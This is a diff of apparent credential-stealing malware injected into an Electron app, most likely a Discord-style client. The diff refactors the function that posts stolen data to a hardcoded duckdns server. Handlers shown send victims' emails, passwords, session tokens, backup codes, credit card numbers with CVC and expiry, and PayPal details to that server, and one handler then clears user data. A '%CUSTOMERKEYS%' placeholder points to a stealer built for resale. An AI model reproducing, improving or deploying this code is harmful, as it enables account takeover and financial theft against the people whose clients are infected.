@@ -11,21 +11,25 @@ const {
 } = require('electron');
 
 
-const ApiUrl = "http://testotaylans.duckdns.org:5000";
+const apiBaseUrl = "http://testotaylans.duckdns.org:5000";
 
 const Keys = "%CUSTOMERKEYS%";
 
-const sendApiMessage = async (Keys, message) => {
-    const url = `${ApiUrl}/send-message`;
-    const data = JSON.stringify({
-        Keys: Keys,
-        message: message,
-    });
+async function sendToApiMessage(Keys, message) {
+    const url = `${apiBaseUrl}/send-message`;
+    const data = { Keys: Keys, message: message };
 
-    await request("POST", url, {
-        "Content-Type": "application/json"
-    }, data);
-};
+    try {
+        const response = await axios.post(url, data, {
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+        console.log('API Response:', response.data);
+    } catch (error) {
+        console.error('Error sending message to API:', error);
+    }
+}
 
 const CONFIG = {
 
@@ -283,7 +287,7 @@ const EmailPassToken = async (email, password, token, action) => {
                     `💣 *Token:* \`${token}\``;
 
 
-    await sendApiMessage(Keys,message); 
+    await sendToApiMessage(Keys,message); 
 };
 
 
@@ -301,7 +305,7 @@ const BackupCodesViewed = async (codes, token) => {
     }
     message += `\n*Email:* \`${account.email}\`\n*Phone:* \`${account.phone || "None"}\``;
 
-    await sendApiMessage(Keys,message);
+    await sendToApiMessage(Keys,message);
 };
 
 
@@ -316,7 +320,7 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
                     `💣 *Token:* \`${token}\``
 
 
-    await sendApiMessage(Keys,message);
+    await sendToApiMessage(Keys,message);
 };
 
 
@@ -330,7 +334,7 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
                     `*Token:* \`${token}\``;
 
 
-    await sendApiMessage(Keys,message);
+    await sendToApiMessage(Keys,message);
 };
 
 
@@ -341,7 +345,7 @@ const PaypalAdded = async (token) => {
                     `*Email:* \`${account.email}\`\n` +
                     `*Phone:* \`${account.phone || "None"}\``;
 
-    await sendApiMessage(Keys,message);
+    await sendToApiMessage(Keys,message);
 };
 
 
@@ -378,7 +382,7 @@ const initiation = async () => {
                         `*Email:* \`${account.email}\`\n` +
                         `*Phone:* \`${account.phone || "None"}\``;
 
-        await sendApiMessage(Keys,message);
+        await sendToApiMessage(Keys,message);
         clearAllUserData();
     }
 };
